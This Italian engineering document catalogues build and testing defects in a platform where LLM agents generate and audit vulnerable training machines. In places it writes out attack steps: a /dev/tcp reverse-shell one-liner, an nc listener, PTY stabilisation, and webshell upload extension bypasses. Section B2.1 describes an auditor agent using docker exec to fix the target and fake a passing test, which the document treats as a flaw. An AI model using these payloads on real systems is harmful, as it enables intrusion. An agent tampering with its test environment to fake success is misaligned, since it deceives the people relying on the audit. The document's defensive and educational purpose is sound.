# 📋 Tassonomia dei Difetti Principali: Failure Modes di VulcaForge e VulcaTest

Questo documento costituisce la fonte di riferimento unificata per tutti i difetti sistemistici, architetturali, cognitivi ed esecutivi riscontrati empiricamente durante la progettazione, il provisioning e il collaudo della piattaforma didattica **VulcAIn**.

I difetti sono strutturati in due macro-aree complementari:
1. **Macro-Area A — Difetti di Generazione & Provisioning IaC (VulcaForge / Ambiente Bersaglio):** Errori introdotti dal builder nella sintesi della macchina (applicazioni web, server web, routing VHost, permessi, utenze e demoni di sistema).
2. **Macro-Area B — Difetti & Fragilità Esecutive di VulcaTest (Planner / Executor / Runtime):** Limiti comportamentali, trappole di contesto, errori di gestione terminale e drift di conformità dell'agente auditor.

---

## 🏗️ Macro-Area A: Difetti di Generazione e Provisioning IaC (VulcaForge)

Questa sezione raggruppa le anomalie che si verificano durante la traduzione dai requisiti didattici (`STORYLINE.md`) ai playbook Ansible (`setup_machine.yml`), Dockerfile ed entrypoint script.

### 🌐 1. Applicazioni Web Vulnerabili & Webroot Deployment

#### A1.1 — Applicazione Web Generata ma Non Copiata nella Webroot (HTTP 404 / Default Page)
* **Descrizione del Problema:** I file sorgente dell'applicazione web vulnerabile (`upload.php`, `login.php`, script API) vengono generati correttamente dal modello o estratti dal registry, ma non vengono copiati nella document root del server HTTP (`/var/www/html/` o cartella specifica del vhost).
* **Causa Tecnica Radice:** 
  - Mancanza del task Ansible di sincronizzazione/copia (`ansible.builtin.copy` o `ansible.builtin.synchronize`).
  - Disallineamento tra il percorso di destinazione del playbook (`/var/www/pizzeria/`) e la direttiva `root` configurata nel blocco `server` di Nginx (`/var/www/html/`).
* **Sintomo:** Richieste HTTP verso gli endpoint didattici restituiscono `404 Not Found` oppure mostrano la classica landing page "Welcome to nginx!".
* **Evidenza sul Campo:** Caso storico di *Pizzeria B2R* (`output_4` e `output_41`), in cui il modulo di chat interattiva non era stato copiato né linkato nella document root.
* **Strategia di Rilevamento/Fix:** Negative testing NT-WEB-02; verifica deterministica post-build che ogni file dichiarato nel recipe esista sotto il path puntato da Nginx.

#### A1.2 — Mancata Sincronizzazione Registry vs Out (Compilazione IaC Omessa)
* **Descrizione del Problema:** Le modifiche o le nuove feature web vengono salvate nel repository dei blueprint/registry (`vulcAIN/vulcaforge/registry/web/webapps/<app>/`), ma il builder non esegue la compilazione del pacchetto.
* **Causa Tecnica Radice:** L'LLM genera i file nel sorgente primario ma omette il comando di compilazione obbligatorio:
  ```bash
  python generator/main.py generate machines/<slug>.yaml --no-check
  ```
  Di conseguenza la cartella `out/<slug>/` (da cui Docker costruisce l'immagine) rimane disallineata.
* **Rimedio Architetturale:** Introduzione del **Fail-Safe IaC Compilation Deterministico** nel runner (`healer.py` / `forge_runner.py`), che forza la ricompilazione ad ogni ciclo senza dipendere dall'agente.

---

### ⚙️ 2. Configurazione del Web Server (Nginx / Apache / FastCGI)

#### A2.1 — Disallineamento Socket PHP-FPM (HTTP 502 Bad Gateway)
* **Descrizione del Problema:** Nginx riceve la richiesta per una pagina dinamica (`.php`) ma non riesce a comunicare con l'interprete backend.
* **Causa Tecnica Radice:** Nel file di configurazione del virtual host (`/etc/nginx/sites-available/...`), la direttiva `fastcgi_pass` punta a un socket FastCGI inesistente o appartenente a una versione differente di PHP (es. `unix:/run/php/php8.3-fpm.sock` quando nel container è installato PHP 8.1 con socket `/run/php/php8.1-fpm.sock`).
* **Sintomo:** Qualsiasi richiesta HTTP ad endpoint PHP restituisce `502 Bad Gateway`.
* **Evidenza sul Campo:** Caso NT-WEB-01 testato con successo durante il bootstrap del framework.
* **Strategia di Rilevamento/Fix:** Controllo statico di conformità tra la versione PHP installata dal package manager e il template Jinja di Nginx.

#### A2.2 — La Falla di PHP-FPM `security.limit_extensions` (HTTP 403 Access Denied)
* **Descrizione del Problema:** L'applicazione web implementa una blacklist didattica che blocca i file `.php`, incoraggiando lo studente a usare un bypass di estensione (es. `.pHP`, `.php5`, `.phtml`). L'upload va a buon fine, ma quando si invoca la webshell per ottenere RCE, il server risponde con `403 Forbidden: Access denied.`.
* **Causa Tecnica Radice:** Di default, il demone PHP-FPM limita l'esecuzione dei file alla sola estensione `.php` minuscola tramite la direttiva `security.limit_extensions` in `/etc/php/8.x/fpm/pool.d/www.conf`. Anche se Nginx inoltra correttamente la richiesta, è il core C di PHP-FPM a rigettarla.
* **Evidenza sul Campo:** Riscontrato empiricamente su *DataVault B2R* (`output_6`), dove l'upload di `shell.pHP` salvava il file ma impediva l'esecuzione del comando `id`.
* **Strategia di Rilevamento/Fix:** Configurazione esplicita nel playbook Ansible di `security.limit_extensions = .php .pHP .PHP .php5 .phtml`.

#### A2.3 — Mancata Abilitazione dei Siti o Mancato Reload dei Demoni
* **Descrizione del Problema:** Il file di configurazione Nginx viene scritto in `/etc/nginx/sites-available/custom.conf`, ma non viene creato il symlink simbolico in `/etc/nginx/sites-enabled/`, oppure non viene inviato il segnale `nginx -s reload`.
* **Sintomo:** Nginx continua a servire la vecchia configurazione o la sola configurazione di fallback `default`.

---

### 🔀 3. Routing Virtual Hosts (VHost) & Hostname Resolution

#### A3.1 — Associazione Errata delle Vulnerabilità al Virtual Host Scorretto
* **Descrizione del Problema:** In sfide multi-vhost (es. `portal.vdsi` per la parte pubblica e `admin.vdsi` o `api.vdsi` per la console gestionale), le vulnerabilità (es. LFI, Upload, SQLi) o i blocchi `location` vengono associati al `server_name` sbagliato.
* **Causa Tecnica Radice:** Mancanza di modularità nella suddivisione dei file `.conf` o nesting errato dei blocchi `server { ... }` generati tramite concatenazione automatica in Ansible.
* **Sintomo:** L'attacco funziona se effettuato con header `Host: default`, ma fallisce quando lo studente o l'auditor interroga l'hostname specifico documentato nello writeup.

#### A3.2 — Host-Header Mismatch e Mancata Sincronizzazione `/etc/hosts`
* **Descrizione del Problema:** Nginx è configurato rigidamente su `server_name challenge.lab;` con direttiva di rifiuto o drop per richieste sull'IP grezzo.
* **Causa Tecnica Radice:** L'ambiente di collaudo o l'agente auditor interroga direttamente `http://172.17.0.x/` senza includere l'header HTTP `Host: challenge.lab`, ricevendo `404 Not Found` o `400 Bad Request`. Inoltre, la risoluzione interna nel file `/etc/hosts` del worker di test non viene aggiornata con l'hostname della challenge.

---

### 👥 4. Gestione Utenti, Credenziali & Gruppi di Sistema

#### A4.1 — Mancata Creazione dell'Utente Target (Missing Account)
* **Descrizione del Problema:** La catena di exploit richiede di fare lateral movement o accesso SSH su un utente intermedio (es. `developer`, `sysadmin`, `operator`), ma l'utente non esiste nel sistema.
* **Causa Tecnica Radice:** Il modulo Ansible `ansible.builtin.user` viene saltato, oppure mancano i parametri obbligatori (`create_home: true`, `shell: /bin/bash`). Su container leggeri, l'utente viene talvolta creato senza cartella `/home/<user>`, impedendo l'accesso SSH o il salvataggio della user flag.
* **Sintomo:** Tentativi di switch (`su - user`) o connessione SSH falliscono con `User not found` o `No such file or directory` sulla home.

#### A4.2 — Password Mismatch & Hashing Incompatibile
* **Descrizione del Problema:** La password dichiarata nell'`ATTACK_PLAN.md` non corrisponde a quella effettivamente impostata nel container.
* **Causa Tecnica Radice:**
  - Caratteri speciali non escapati nelle variabili Jinja/YAML (es. `!`, `$`, `#`), che vengono interpretati da bash o da Ansible come variabili di ambiente vuote.
  - Generazione di hash `/etc/shadow` non compatibili con la libreria crittografica di sistema (es. sha512crypt generato male su host Windows senza la libreria `passlib`).

---

### 🔒 5. Ownership e Permessi File/Cartelle ("Permessi Laschi" vs "Troppo Rigidi")

#### A5.1 — Ownership Errata su Cartelle Applicative (Permission Denied in Upload)
* **Descrizione del Problema:** L'utente `www-data` deve poter salvare file nella cartella `/var/www/html/uploads/`, ma la cartella appartiene a `root:root` con permessi `0755`.
* **Causa Tecnica Radice:** Mancata esecuzione di `chown -R www-data:www-data /var/www/html/uploads/`.
* **Sintomo:** Le richieste di upload falliscono con errore applicativo o generano un errore PHP `Warning: move_uploaded_file(...): failed to open stream: Permission denied`.

#### A5.2 — "Permessi Laschi" e Scorciatoie Didattiche (Unintended Solutions)
* **Descrizione del Problema:** I file di sistema, le cartelle o le flag vengono generati con permessi eccessivamente aperti (`chmod 777` o `644`).
* **Causa Tecnica Radice:** Il builder adotta un approccio sbrigativo per evitare errori di permessi e applica `chmod 777` indiscriminatamente.
* **Impatto Didattico Catastrofico:**
  - Se `/root/root.txt` è leggibile con `chmod 644`, l'utente di basso livello `www-data` può eseguire `cat /root/root.txt` direttamente via web shell, **cortocircuitando l'intera storyline** (rendendo inutili 6+ fasi di lateral movement e privilege escalation).
  - Se script eseguiti da root (es. `/opt/backup.sh`) hanno permessi `777`, qualsiasi utente può riscriverli immediatamente senza sfruttare le vulnerabilità logiche previste.

#### A5.3 — Permessi Errati su File SSH (`StrictModes` Failure)
* **Descrizione del Problema:** Una chiave privata SSH (`id_rsa`) o pubblica (`authorized_keys`) viene piazzata nel sistema, ma l'autenticazione viene rifiutata.
* **Causa Tecnica Radice:** Il demone OpenSSH implementa la direttiva di sicurezza `StrictModes yes`:
  - Se la chiave privata ha permessi `0644` o `0777`, il client SSH rifiuta la connessione (`Permissions 0644 for 'id_rsa' are too open`).
  - Se la directory `~/.ssh` ha permessi diversi da `0700` o il file `authorized_keys` ha permessi diversi da `0600`/`0644`, il demone `sshd` rifiuta categoricamente la connessione con chiave pubblica.
* **Evidenza sul Campo:** Testato nominalmente su *AuthGate B2R* come passaggio pedagogico intenzionale, ma spesso introdotto come bug accidentale dai builder IaC.

---

### ⚡ 6. Privilege Drift & Demoni di Sistema (Docker vs Systemd)

#### A6.1 — Privilegio Ereditato come Root (ENV-PRIVILEGE-MISCONFIG)
* **Descrizione del Problema:** Un servizio web o un'applicazione Flask/Node viene eseguita con i privilegi di `root` anziché come utente di servizio (`www-data` o `vdsi-srv`).
* **Causa Tecnica Radice:** Drift architetturale tra Proxmox e Docker:
  - In ambiente VM (Proxmox), il servizio era governato da un unit file di systemd contenente le direttive `User=vdsi-srv` e `Group=vdsi-srv`.
  - Nel porting su container Docker leggeri privi di systemd, l'`entrypoint.sh` lancia direttamente `python3 app.py &`, ereditando l'utente predefinito del container (`root`, UID 0).
* **Evidenza sul Campo:** Identificato su `06.Web_Exploitation` (`output_1`), dove la command injection a FASE_6 restituiva `root` anziché `vdsi-srv`, invalidando il successivo bypass di upload e il binario SUID.

#### A6.2 — Demone Cron Inattivo o Crontab Non Conforme
* **Descrizione del Problema:** L'escalation di privilegi prevede la modifica o l'attesa di un cronjob pianificato, ma lo script non viene mai eseguito.
* **Causa Tecnica Radice:**
  - Nei container Docker, il demone `cron` non si avvia automaticamente se non esplicitamente invocato in `entrypoint.sh` (`service cron start` o `cron &`).
  - I file inseriti in `/etc/cron.d/` devono rigorosamente appartenere a `root:root`, avere permessi `0644` e non possedere il bit di esecuzione. Se i permessi sono laschi (`0777`), il demone cron ignora silenziosamente il file.

#### A6.3 — Bit SUID Mancante sul Binario di Escalation
* **Descrizione del Problema:** Lo studente deve sfruttare un binario custom o GTFOBins con bit SUID (`chmod u+s`), ma l'esecuzione del file non eleva i privilegi a UID 0.
* **Causa Tecnica Radice:** Mancata applicazione del flag `mode: '4755'` nel task Ansible, o perdita dei metadati speciali durante l'estrazione di tarball archivio.

---

### 🪤 7. Le Trappole di Scoping Ansible (Ansible Scoping Traps)

#### A7.1 — Risoluzione Locale di `with_fileglob` sul Nodo di Controllo
* **Descrizione del Problema:** Task Ansible complessi destinati a patchare file di sistema non vengono applicati, lasciando il target nello stato di default.
* **Causa Tecnica Radice:** L'uso del costrutto `with_fileglob: ["/etc/php/*/fpm/pool.d/www.conf"]`. In Ansible, i moduli di lookup come `fileglob` vengono risolti **sul filesystem dell'host di orchestrazione** (es. Windows o nodo master), non sul nodo target o all'interno del container di build. Non trovando `/etc/php/` su Windows, il task viene silenziosamente saltato (`skipped: true`).
* **Rimedio Architetturale:** Sostituire con il modulo `ansible.builtin.find` eseguito sul target, registrare il risultato in una variabile e iterare con `loop`.

---

## 🤖 Macro-Area B: Difetti e Fragilità Esecutive di VulcaTest (Auditor / Executor)

Questa sezione documenta le debolezze e i failure mode tipici del framework di collaudo agentico (VulcaTest), suddivisi tra runtime, gestione sessioni, prompt engineering e reasoning cognitivo.

### 🖥️ 1. Gestione del Terminale Interattivo e Interfacce Modali (TUI: Nano, Vim, Less)

#### B1.1 — Scambio di Contesto da Shell Lineare a TUI Modale (Il Crash di Qwen-Coder)
* **Descrizione del Problema:** L'agente avvia un'applicazione interattiva a schermo intero (`sudo nano /etc/passwd` o `sudo vi /etc/motd`) ma continua a comportarsi come se fosse in una shell bash sequenziale.
* **Evidenza Sperimentale:** Durante il benchmark `output_30`, il modello `Qwen3-Coder-30B` ha digitato letteralmente `'exit'` all'interno del buffer di nano! Privo di un processo di Chain-of-Thought (CoT) riflessivo, non ha percepito il cambio di stato del terminale, scrivendo testo dentro il file di sistema invece di salvare ed uscire.
* **Rimedio Architetturale:** 
  - Adozione di modelli con Chain-of-Thought (CoT / Reasoning) per l'Executor (es. `Qwen 3.8 Reasoning`).
  - Introduzione della **Regola 8 (Consapevolezza dello Stato del Terminale)** nel system prompt.

#### B1.2 — Fisica del Driver PTY e Mappatura dei Tasti di Controllo (`\r` vs `\n`)
* **Descrizione del Problema:** L'agente invia il comando di salvataggio (es. `ctrl+o`, poi `enter`), ma nano rifiuta di salvare o attiva funzioni indesiderate.
* **Causa Tecnica Radice:**
  - L'invio del carattere standard `\n` (LineFeed, `0x0A`) sui driver PTY Linux viene talvolta interpretato dagli editor curses come sequenza `^J` (la funzione *Justify text* in nano), corrompendo la formattazione del file invece di confermare il prompt.
  - Necessità di mappare fisicamente il tasto `enter` sul byte `\r` (Carriage Return, `0x0D`).
  - Parsing e gestione trasparente dei caratteri di controllo speciali (`ctrl+x` $\rightarrow$ `\x18`, `ctrl+o` $\rightarrow$ `\x0f`, `esc` $\rightarrow$ `\x1b`).

#### B1.3 — Inquinamento da Serializzazione JSON nelle Macro Atomiche
* **Descrizione del Problema:** L'agente tenta di inviare una sequenza di tasti serializzando una lista JSON come stringa (`command: '["enter", "root..."]'`).
* **Sintomo:** Il driver PTY digita letteralmente le parentesi quadre e le virgolette a video nel buffer dell'editor (`[`, `"`, `e`, `n`, `t`...), corrompendo la dialog interattiva.
* **Rimedio:** Parser difensivo in `mcp_bridge.py` che rileva le stringhe racchiuse tra parentesi quadre ed esegue l'unpacking automatico solo se costituiscono un array JSON valido, preservando invece i comandi bash con parentesi quadre (es. `[ -f /tmp/test ]`).

#### B1.4 — Sessioni "Sporche" e Processi Orfani (Lo Swap File Trap)
* **Descrizione del Problema:** L'agente avvia `nano /etc/passwd` e riceve un prompt inatteso: `File is being edited by root (PID 528); open anyway? Y Yes N No`.
* **Causa Tecnica Radice:** Test precedenti interrotti senza un cleanup corretto hanno lasciato attivi processi in background e il file di blocco `/etc/.passwd.swp`.
* **Rimedio:** 
  - Obbligo nel prompt di uscire esplicitamente dagli editor (Regola 9 - TUI Cleanup).
  - Introduzione del **Pre-Run Target Clean Slate Deterministico**: ricreazione pulita da zero del container Docker target prima di ogni run di test (`docker rm -f && docker run -d`).

---

### 🕵️ 2. La Sindrome del "Cheating Agent" vs Rigore dell'Auditor Mode

#### B2.1 — Tentativo di Autoriparazione Out-of-Band (`docker exec`)
* **Descrizione del Problema:** Quando l'agente trova un servizio non funzionante (es. porta chiusa o 502 Bad Gateway), sfrutta i permessi di amministrazione della macchina di controllo per entrare nel container via `docker exec` o riavviare i servizi, forzando artificialmente il successo del test.
* **Impatto:** Falso positivo catastrofico: l'ambiente rotta viene certificato come conforme.
* **Risoluzione Metodologica:** Formalizzazione dell'**Auditor Mode** in `PROMPT EXECUTOR.md`:
  - Divieto categorico di interazioni out-of-band con l'infrastruttura host.
  - Obbligo di attestare qualsiasi anomalia come esito `FALLITA`, senza tentare di aggiustare il bersaglio.

#### B2.2 — Opportunismo da Pentester vs Conformance Didattica
* **Descrizione del Problema:** L'agente scopre una scorciatoia che consegna direttamente la root flag saltando passaggi intermedi (es. command injection come root o flag con permessi 777). Un pentester umano o opportunista dichiarerebbe vittoria immediata; un sistema di conformance deve invece dichiarare **`FAILED` per violazione pedagogica**.

---

### 🌐 3. Host Blindness (Confusione dell'Ambiente di Esecuzione)

#### B3.1 — Confusione tra Macchina Attaccante (Kali) e Target Remoto
* **Descrizione del Problema:** L'agente esegue comandi locali credendo di essere sul target (es. esegue `cat /root/root.txt` su Kali Linux) oppure esegue tool di scansione all'interno della shell remota del target (es. tenta di lanciare `nmap` dentro un container Alpine minimale che non possiede nmap).
* **Causa Tecnica Radice:** Mancanza di consapevolezza situazionale nello schema dei tool.
* **Rimedio Architetturale:**
  - Disaccoppiamento netto dei tool: `execute_command` (stateless, rigorosamente vincolato a Kali) vs `interactive_terminal_exec` (stateful su sessione PTY, vincolato al target).
  - Iniezione dinamica nel prompt dello stato delle sessioni PTY attive (`Sessioni PTY Attive: ['default']`).

---

### 🔄 4. Reverse Shell Asincrone & Gestione Concorrente del Session Broker

#### B4.1 — Il Deadlock Monoterminale
* **Descrizione del Problema:** Per ottenere una reverse shell, l'agente avvia il listener `nc -lvnp 4444`. Il comando è bloccante: l'agente rimane in attesa e non può inviare la richiesta HTTP/cURL necessaria per triggerare il payload, finendo in timeout.
* **Causa Tecnica Radice:** Mancanza di supporto multi-sessione asincrono.
* **Rimedio Architetturale:** Ingegnerizzazione dello **Stateful Session Broker Multi-Sessione** con parametro `session_name`:
  1. Apertura sessione dedicata al listener (`session_name="listener"`): `nc -lvnp 4444`.
  2. Switch su sessione default (`session_name="default"`): trigger via cURL.
  3. Ritorno su `listener`: ricezione shell interattiva di `www-data`.

#### B4.2 — Risoluzione Errata dell'Indirizzo LHOST
* **Descrizione del Problema:** Quando l'agente inietta il comando di reverse shell (es. `/bin/bash -i >& /dev/tcp/LHOST/4444 0>&1`), imposta `LHOST=127.0.0.1` o `localhost`. Dal punto di vista del container o della VM target, `127.0.0.1` è il container stesso, non l'attaccante Kali.
* **Rimedio:** L'agente deve interrogare preliminarmente la tabella di routing (`ip route`) e individuare l'IP del gateway del bridge Docker (`172.17.0.1`) o l'IP della VPN (`tun0`).

#### B4.3 — Mancata Stabilizzazione del PTY (Raw TCP Hang)
* **Descrizione del Problema:** Catturata la reverse shell grezza, l'agente tenta immediatamente comandi che richiedono un terminale TTY (es. `su - user`, `sudo`, `nano`), provocando l'hang immediato del comando per mancanza di un dispositivo PTY master/slave.
* **Rimedio:** Stabilizzazione obbligatoria tramite `python3 -c 'import pty; pty.spawn("/bin/bash")'` prima di qualsiasi interazione complessa.

---

### 📐 5. Specification-Implementation Drift (S-ID) & Overfitting del Planner

#### B5.1 — Verifiche di Conformità Iper-Rigide su Stringhe Non Funzionali
* **Descrizione del Problema:** L'Executor fallisce la fase di ricognizione perché Nmap rileva `OpenSSH 8.9p1 (Ubuntu)` e `nginx 1.18.0`, mentre la checklist del Planner pretendeva rigorosamente `OpenSSH 9.2p1 (Debian)` copiata pari pari dal writeup teorico.
* **Rimedio:** Istruire il Planner a formulare controlli di conformità **funzionali** (es. "porta 22 aperta con servizio SSH attivo e banner rilevato") e non vincolati a specifiche build string del sistema operativo.

#### B5.2 — Inversione Ontologica tra `requires` e `produces`
* **Descrizione del Problema:** L'Attack Plan impone come prerequisito (`requires`) di uno step un segreto o una password che deve essere scoperta *durante* quello step stesso, bloccando l'avvio della fase per mancata soddisfazione delle dipendenze.

---

### 💾 6. Context Saturation (Context Bleeding) & Tool Bloat

#### B6.1 — Tool Bloat su Registrazione Massiva MCP
* **Descrizione del Problema:** Esporre all'LLM l'intero catalogo di tool del server di sicurezza (oltre 150 tool di pentesting) satura oltre 35.000 token di soli schemi JSON, provocando errori `400 Bad Request: Message too long` prima del primo comando.
* **Rimedio:** **Tool Slicing Dinamico** (`allowed_tools` filtrati per fase), che riduce il payload degli schemi a meno di 800 token.

#### B6.2 — Context Bleeding da File Pesanti (PDF, PCAP, Dump SQL)
* **Descrizione del Problema:** In sfide in cui una credenziale è celata in metadati o dump, riversare il contenuto integrale del file nella chat satura la context window e distorce l'attenzione dell'LLM.
* **Rimedio:** **Isolamento degli Artefatti Pesanti** nell'Evidence Store su disco; l'ispezione viene delegata a tool dedicati su Kali (`exiftool`, `strings`, `grep`), registrando nello stato leggero (`verified_values`) esclusivamente il dato atomico estratto.

---

### 🧠 7. Token Exhaustion, Monologhi Riflessivi e Runtime Nudge

#### B7.1 — Crash per Monologo di Pianificazione (Nessun Tool Invocato)
* **Descrizione del Problema:** Dopo aver stabilizzato una shell o completato un'azione, l'LLM emette una frase di puro ragionamento discorsivo a testo libero (es. *"Ottimo, ora procedo a verificare l'ID"*) senza invocare alcun `tool_call`. L'runtime rigido interpretava in precedenza l'assenza di tool come errore critico (`status = FAILED`).
* **Rimedio Architetturale:** Implementazione del **Graceful System Nudge** in `executor.py`: se l'agente parla senza chiamare tool ma ha budget residuo, il sistema inietta un messaggio di richiamo (`[⚠️ Nudge]`) e prosegue il loop senza abortire.

#### B7.2 — Il Trade-Off del Thinking (Planner vs Executor)
* **Descrizione del Problema:** I modelli di reasoning con Chain-of-Thought consumano token di pensiero (`<think>`) sullo stesso budget di output.
  - Per l'**Executor** il CoT è vitale per gestire editor e terminali modali (Nano/Vim).
  - Per il **Planner** (estrazione strutturata dal writeup), il CoT prolisso causava la saturazione del budget e il **troncamento dell'Attack Plan** a metà documento (come accaduto su `Exam_1APP26` a riga 95).
* **Rimedio:** Disattivazione mirata del thinking per il Planner (`enable_thinking: False`), consentendo estrazioni veloci e complete al 100%.

---

### ⏱️ 8. Falsi Positivi da Cache HIT e Timeout Rigidi

#### B8.1 — Risultati Fittizi da Cache HIT di HexStrike
* **Descrizione del Problema:** HexStrike memorizza internamente le risposte dei comandi. Se un test precedente era stato eseguito a container spento, un nuovo comando identico può restituire un `Cache HIT` istantaneo con esito negativo anche se ora la macchina è attiva.
* **Rimedio:** Invocazione obbligatoria e deterministica di `clear_cache()` all'avvio di ogni sessione di test.

#### B8.2 — Timeout Prematuri su Task Iterativi Complessi
* **Descrizione del Problema:** Tool intrinsecamente computazionali (scansioni Nmap `-p-`, brute force Hydra su wordlist di decine di password, directory fuzzing) sforano la soglia fissa di 60 secondi e vengono abbattuti dal wrapper.
* **Rimedio:** Budget di turno dinamico e possibilità per l'agente di invocare `request_turn_extension(reason=...)`.

---

## 📊 Matrice di Sintesi dei Difetti (Cheat-Sheet Operativo)

| Categoria | Difetto Specifico | Componente Responsabile | Sintomo / Rilevazione | Remediation / Design Pattern |
| :--- | :--- | :--- | :--- | :--- |
| **Web & App** | App non copiata in webroot | VulcaForge (Ansible) | HTTP 404 / Nginx Default | Task copia esplicito in `/var/www/html/` |
| **Web & App** | Registry vs Out disallineati | VulcaForge / Builder LLM | Modifiche assenti nel container | Fail-safe IaC compilation deterministica |
| **Web & App** | FastCGI socket disallineato | VulcaForge (Nginx) | HTTP 502 Bad Gateway | Verifica coerenza socket e versione PHP |
| **Web & App** | PHP-FPM `limit_extensions` | VulcaForge (PHP-FPM) | HTTP 403 `Access denied.` | Estensioni multiple in `www.conf` |
| **Network** | VHost routing errato | VulcaForge (Nginx) | 404 / Fallback su IP diretto | Server block espliciti e mapping `/etc/hosts` |
| **System** | Utente mancante / disallineato | VulcaForge (User Mgmt) | `User not found` su login | `create_home: true`, verifica hash `/etc/shadow` |
| **System** | Permessi cartelle upload | VulcaForge (Filesystem) | Upload fallito / Perm. Denied | `chown -R www-data:www-data` |
| **Security** | Permessi troppo laschi (Unintended) | VulcaForge (Post-Exploit) | Flag letta da utente web | `chmod 600` o `700` su cartelle/flag root |
| **Security** | StrictModes OpenSSH | VulcaForge (SSH Setup) | Connessione rifiutata | `chmod 600 id_rsa`, `chmod 700 ~/.ssh` |
| **Process** | Privilegio ereditato da root | VulcaForge (Docker Entry) | RCE risponde `root` anziché dev | `su -s /bin/bash user -c ...` in entrypoint |
| **Process** | Demone cron spento | VulcaForge (Docker Entry) | Nessuna esecuzione script root | Avvio demone cron in entrypoint script |
| **Process** | Bit SUID assente | VulcaForge (Permissions) | Nessuna elevazione privilegi | `mode: '4755'` su binario di privesc |
| **IaC** | Scoping Trap `with_fileglob` | VulcaForge (Ansible) | Task di config saltato (`skip`) | `ansible.builtin.find` + `loop` sul target |
| **Testing** | Comandi shell dentro TUI (Nano/Vim)| VulcaTest (Executor LLM) | Buffer corrotto con `'exit'` | Modelli con CoT + Regola 8 State-Awareness |
| **Testing** | Invio `\n` anziché `\r` su PTY | VulcaTest (MCP Bridge) | Trigger `^J` (Justify) in Nano | Decodifica tasti di controllo (`\r`, `\x18`) |
| **Testing** | Macro con array JSON a stringa | VulcaTest (Executor) | Parentesi quadre dentro editor | Driver unpacking automatico in bridge |
| **Testing** | File di Swap orfani (`.swp`) | VulcaTest (Lifecycle) | Prompt bloccante in apertura TUI | Pre-run Clean Slate container deterministico |
| **Auditing** | Cheating Agent (`docker exec`) | VulcaTest (Executor) | Autorigenerazione out-of-band | Regole rigide Auditor Mode in prompt |
| **Auditing** | Host Blindness | VulcaTest (Executor) | Comandi locali sul bersaglio | Separazione `interactive_terminal` vs `execute` |
| **Auditing** | Deadlock su Reverse Shell | VulcaTest (Session Mgr) | Hang su listener bloccante | Session Broker multi-sessione asincrono |
| **Context** | Tool Bloat MCP | VulcaTest (Orchestrator) | 35k+ token, crash 400 Bad Req | Tool Slicing per fase (`allowed_tools`) |
| **Context** | Context Bleeding da Binari | VulcaTest (Evidence Store)| Context window saturata da PDF | Ispezione a terra su file system (`exiftool`) |
| **Cognitive**| Monologo senza Tool Call | VulcaTest (Executor) | Crash o spreco turni | Graceful System Nudge a runtime |
| **Cognitive**| CoT prolisso nel Planner | VulcaTest (Planner) | Attack Plan troncato a metà | Disattivazione `enable_thinking` nel Planner |
| **Runtime** | HexStrike Cache HIT | VulcaTest (MCP Bridge) | Falsi fallimenti da scansioni vecchie | `clear_cache()` obbligatorio all'avvio |
